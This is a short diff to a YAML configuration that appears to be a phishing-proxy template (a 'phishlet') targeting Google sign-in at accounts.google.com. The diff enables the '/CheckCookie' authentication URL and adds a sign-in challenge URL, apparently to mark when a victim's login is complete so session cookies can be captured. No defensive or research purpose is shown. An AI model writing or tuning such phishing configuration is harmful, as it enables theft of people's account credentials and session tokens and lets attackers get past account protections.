@@ -71,8 +71,9 @@ credentials:
     type: 'post'
 
 auth_urls:
-  #- '/CheckCookie'
+  - '/CheckCookie'
   - '/_/AccountSettingsUi/browserinfo'
+  - '/_/signin/sl/challenge'
 
 login:
   domain: 'accounts.google.com'
